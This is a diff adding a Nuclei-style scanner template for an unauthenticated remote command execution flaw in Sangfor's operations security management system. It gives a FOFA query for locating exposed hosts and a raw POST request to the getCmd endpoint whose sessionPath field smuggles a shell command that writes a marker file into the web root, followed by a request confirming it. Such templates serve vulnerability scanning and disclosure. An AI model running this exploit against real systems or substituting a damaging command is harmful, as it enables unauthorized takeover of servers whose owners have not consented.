@@ -1,0 +1,36 @@
+id: sangfor-oms-getcmd-unauthorized-rce
+info:
+  name: 深信服运维安全管理系统 getCmd 接口未授权远程命令执行
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+
+    深信服运维安全管理系统中的 getCmd 接口存在权限校验缺失问题。攻击者利用此缺陷发送特制请求，即可在目标服务器上执行任意系统命令。由于该漏洞无需身份认证，可导致系统控制权完全丧失。受影响组件未能对输入数据进行有效过滤，从而允许命令注入攻击发生。
+  tags: 深信服运维安全管理系统
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /isomp-protocol/protocol/getCmd HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    sessionPath=;echo NdayTest>/usr/local/tomcat/webapps/isomp-protocol/NTest.txt;&sid=1
+- raw:
+  - |
+    GET /isomp-protocol/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
